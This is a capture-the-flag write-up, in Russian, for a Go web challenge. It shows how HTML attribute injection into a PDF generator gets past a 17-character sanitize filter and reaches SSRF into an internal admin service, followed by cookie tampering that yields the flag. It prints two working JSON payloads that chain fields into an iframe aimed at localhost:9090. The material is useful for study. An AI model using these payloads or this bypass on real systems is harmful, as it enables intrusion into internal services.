## trustmebroker writeup

Для решения таска, нужно было обратить внимание, что `/step2` преобразует JSON не в структуру, а в `map[string]string`. Это намекает на то, что сервер может излишне доверять пользовательскому вводу. Более того, после обработки в сервисе `web`, `map[string]string` снова превращается в JSON и отправляется в PDF генератор. Подозрительно, не правда ли?

Беря во внимание то, что кроме генерации PDF функционала нет и существует сервис `admin` (в docker-compose), с которым никак не взаимодействует основной сервис, гуглим `PDF Converter pentest` и понимаем, что для решения необходимо получить ssrf.

Пробуем заинжектить HTML в value передаваемого на сервер JSON, однако жесткая фильтрация не дает этого сделать.

```
func sanitize(a string) string {
	a = strings.ReplaceAll(a, "<", "")
	a = strings.ReplaceAll(a, ">", "")
	a = strings.ReplaceAll(a, "\"", "")
	a = strings.ReplaceAll(a, "'", "")
	a = strings.ReplaceAll(a, "\\", "")
	cut := 17
	if len(a) < 17 {
		cut = len(a)
	}
	a = a[:cut]
	return a
}
```

Вспоминаем, что засчет каста к `map[string]string` есть возможность добавить произвольное поле в JSON объект и оно попадет в PDF генератор. Передаем произвольное поле, например `..., 'a':'b'}` и видим что все `a` в сгенерированном документе заменились на `b`, вероятно поплыла верстка. И тут мы переходим к сути. 

Обход фильтрации заключается в том, что хоть мы и не можем добавлять теги, мы можем заинжектить нужный нам HTML внутрь другого тега. 

Однако ограничение на 17 (rip) символов ввода все ещё не дает развернуться полноценно. Обходится это рекурсивной сборкой пэйлоада из нескольких полей. Например:

```
{
  "body":"iframe height=kek",
  "kek":"800 width=800 lwe",
  "lwe":"src=http://locmsa"
  "msa":"alhost:9090/agzzz", // или admin:9090
  "zzz":"reements",
  "email":"test@test.test",
  "firstname":"1",
  "middlename":"2",
  "birthdate":"2017-12-12",
  "passport_series":"123",
  "passport_number":"1",
  "passport_issued_by":"2",
  "passport_issued_date":"2012-12-12",
  "address":"1",
  "agree":"1",
  "lastname":"test"
}
```

Ещё мне понравился вариант @enabling:

```
{"h1":"xn | * src=xz:xc","xz":"http://127.0.0.1","xc":"9090/agreements$","xn":"iframe","|":"width=700","*":"height=2000","$":"?page=1"}
```

После этого получаем ssrf, попадаем в админку, видим кнопку "Договоры на рассмотрении", идем на `/agreements?page=x`, находим первую запись в DB, копируем номер договора, вставляем его в куку agreement_id и получаем флаг:

<img width="700" alt="image" src="https://github.com/user-attachments/assets/8f865f23-c09d-43ce-837f-47a7b62e1601" />


flag: `ctfcup{61d402f23f8f16637cff1c08f303bebc9a9eaf19abf056f988fcab69ef43}`
